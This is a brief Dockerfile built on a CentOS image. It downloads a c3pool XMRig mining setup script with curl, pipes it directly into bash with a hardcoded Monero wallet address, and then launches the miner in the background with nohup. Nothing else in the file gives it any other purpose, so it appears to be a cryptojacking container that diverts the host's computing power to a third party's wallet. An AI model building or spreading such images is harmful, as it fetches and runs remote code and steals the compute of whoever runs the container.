FROM docker.io/centos:latest

RUN curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 44NRTdPfmnNLRnqUJ9GMFybWtAUzBd85yb2AmAV4ovBb2Cpb3xta8Y37QhVtv7ufZLMdJtFMQ89a9CY97n1C67T1MFXmTpv
RUN nohup sh  ./root/c3pool/miner.sh &
